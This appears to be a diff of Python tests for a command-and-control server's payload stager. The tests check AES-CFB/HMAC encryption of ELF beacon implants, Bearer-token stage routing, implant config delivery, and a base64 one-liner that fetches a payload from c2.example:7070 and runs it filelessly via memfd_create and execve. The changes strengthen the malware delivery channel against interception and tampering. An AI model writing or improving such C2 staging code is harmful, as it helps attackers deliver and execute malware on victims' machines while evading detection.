@@ -41,6 +41,7 @@ from c2.server import (
     stage_encode,
     stage_keys,
     STAGE_HKDF_SALT,
+    STAGE_HKDF_INFO_ENC,
 )
 
 # Load the stager payload module for parity checks
@@ -68,35 +69,51 @@ class TestStageCodec:
         payload = b"\x7fELF" + os.urandom(500)
         assert stage_decode(stage_encode(payload, "s3cret"), "s3cret") == payload
 
-    def test_no_key_material_on_wire(self):
-        """Given a captured response, when decoded without the token, then fail."""
+    def test_wrong_token_fails_auth(self):
+        """Given a captured response, when decoded with wrong token, then fail closed."""
         payload = b"\x7fELF" + os.urandom(500)
         packed = stage_encode(payload, "s3cret")
-        assert b"." not in packed  # no keys line
-        assert stage_decode(packed, "wrong-token") != payload
+        assert stage_decode(packed, "wrong-token") is None
+
+    def test_tampered_payload_fails_auth(self):
+        payload = b"\x7fELF" + os.urandom(200)
+        packed = bytearray(stage_encode(payload, "s3cret"))
+        # flip a byte in base64 body (avoid trailing newline)
+        if packed[10] != ord("A"):
+            packed[10] = ord("A")
+        else:
+            packed[10] = ord("B")
+        assert stage_decode(bytes(packed), "s3cret") is None
 
     def test_keys_derived_deterministically_from_token(self):
         k1 = stage_keys("s3cret")
         k2 = stage_keys("s3cret")
         assert k1 == k2
-        assert len(k1) == 3 and all(len(k) == 32 for k in k1)
+        assert len(k1) == 2 and all(len(k) == 32 for k in k1)
 
-    def test_server_payload_hkdf_parity(self):
+    def test_server_payload_crypto_parity(self):
         """Server encode must be exactly what the stager payload decodes."""
         payload = b"\x7fELF" + os.urandom(500)
         packed = stage_encode(payload, "s3cret")
-        assert stage_payload._fetch_and_decode.__name__ == "_fetch_and_decode"
-        # Replicate the payload's decode path against the packed body
-        blob = base64.b64decode(packed.strip())
-        ikm = "s3cret".encode()
-        for info in reversed(stage_payload.HKDF_INFOS):
-            key = stage_payload.hkdf_sha256(ikm, stage_payload.HKDF_SALT, info)
-            blob = bytes(v ^ key[i % len(key)] for i, v in enumerate(blob))
-        assert blob == payload
-        # And the pure-python HKDF matches the server's
-        assert stage_payload.hkdf_sha256(b"ikm", STAGE_HKDF_SALT, b"stage-l1") == stage_keys(
-            "ikm"
-        )[0]
+        # replicate stager decode path
+        raw = base64.b64decode(packed.strip())
+        tag = raw[-32:]
+        body = raw[:-32]
+        ikm = b"s3cret"
+        enc_key = stage_payload.hkdf_sha256(ikm, stage_payload.HKDF_SALT, stage_payload.HKDF_INFO_ENC)
+        mac_key = stage_payload.hkdf_sha256(ikm, stage_payload.HKDF_SALT, stage_payload.HKDF_INFO_HMAC)
+        expected = stage_payload.hmac.new(mac_key, body, stage_payload.hashlib.sha256).digest()
+        assert stage_payload.hmac.compare_digest(tag, expected)
+        iv, ciphertext = body[:16], body[16:]
+        cipher = stage_payload.Cipher(
+            stage_payload.algorithms.AES(enc_key),
+            stage_payload.modes.CFB(iv),
+            backend=stage_payload.default_backend(),
+        )
+        dec = cipher.decryptor()
+        assert dec.update(ciphertext) + dec.finalize() == payload
+        # HKDF parity with server
+        assert stage_payload.hkdf_sha256(b"ikm", STAGE_HKDF_SALT, STAGE_HKDF_INFO_ENC) == stage_keys("ikm")[0]
 
 
 class TestStageToken:
@@ -168,7 +185,7 @@ class TestStageRouting:
         beacon = tmp_path / "beacon"
         beacon.write_bytes(elf)
         state = make_state(tmp_path, beacon=str(beacon))
-        raw = "GET /stage/beacon/s3cret HTTP/1.1\r\nHost: x\r\n\r\n"
+        raw = "GET /stage/beacon HTTP/1.1\r\nHost: x\r\nAuthorization: Bearer s3cret\r\n\r\n"
         resp = handle_request(state, raw)
         assert stage_decode(resp, "s3cret") == elf
 
@@ -177,13 +194,18 @@ class TestStageRouting:
         conf.write_text("{}")
         monkeypatch.setenv("BSB_CONFIG", str(conf))
         state = make_state(tmp_path)
-        raw = "GET /stage/config/s3cret HTTP/1.1\r\nHost: x\r\n\r\n"
+        raw = "GET /stage/config HTTP/1.1\r\nHost: x\r\nAuthorization: Bearer s3cret\r\n\r\n"
         decoded = json.loads(stage_decode(handle_request(state, raw), "s3cret").decode())
         assert "c2" in decoded and "server" not in decoded
 
     def test_wrong_token_routed_rejected(self, tmp_path):
         state = make_state(tmp_path)
-        raw = "GET /stage/beacon/nope HTTP/1.1\r\nHost: x\r\n\r\n"
+        raw = "GET /stage/beacon HTTP/1.1\r\nHost: x\r\nAuthorization: Bearer nope\r\n\r\n"
+        assert handle_request(state, raw) == b"STAGE_FORBIDDEN\r\n"
+
+    def test_missing_auth_header_rejected(self, tmp_path):
+        state = make_state(tmp_path)
+        raw = "GET /stage/beacon HTTP/1.1\r\nHost: x\r\n\r\n"
         assert handle_request(state, raw) == b"STAGE_FORBIDDEN\r\n"
 
     def test_legacy_selector_routed(self, tmp_path):
@@ -200,11 +222,15 @@ class TestStageOneliner:
         oneliner = build_stage_oneliner(cfg)
         assert "BSB_STAGE_URL='https://c2.example:7070'" in oneliner
         assert "BSB_STAGE_TOKEN='s3cret'" in oneliner
+        # token must not be embedded in a URL path
+        assert "/stage/beacon/s3cret" not in oneliner
+        assert "/stage/config/s3cret" not in oneliner
         blob = oneliner.split("echo ", 1)[1].split(" |", 1)[0]
         decoded = base64.b64decode(blob).decode()
         assert "memfd_create" in decoded
         assert "execve" in decoded
         assert "hkdf_sha256" in decoded
+        assert "Authorization" in decoded
 
 
 def _self_signed_cert(td: Path):
@@ -265,12 +291,11 @@ class TestStageTLSEndToEnd:
         time.sleep(0.5)
 
         ctx = ssl._create_unverified_context()
-        rq = urllib.request.urlopen(
-            f"https://127.0.0.1:{port}/stage/beacon/s3cret", context=ctx
+        req = urllib.request.Request(
+            f"https://127.0.0.1:{port}/stage/beacon",
+            headers={"Authorization": "Bearer s3cret"},
         )
-        blob = base64.b64decode(rq.read().strip())
-        ikm = "s3cret".encode()
-        for info in reversed(stage_payload.HKDF_INFOS):
-            k = stage_payload.hkdf_sha256(ikm, stage_payload.HKDF_SALT, info)
-            blob = bytes(v ^ k[i % len(k)] for i, v in enumerate(blob))
-        assert blob == elf
+        rq = urllib.request.urlopen(req, context=ctx)
+        blob = rq.read()
+        # decode using stager/server crypto
+        assert stage_decode(blob, "s3cret") == elf
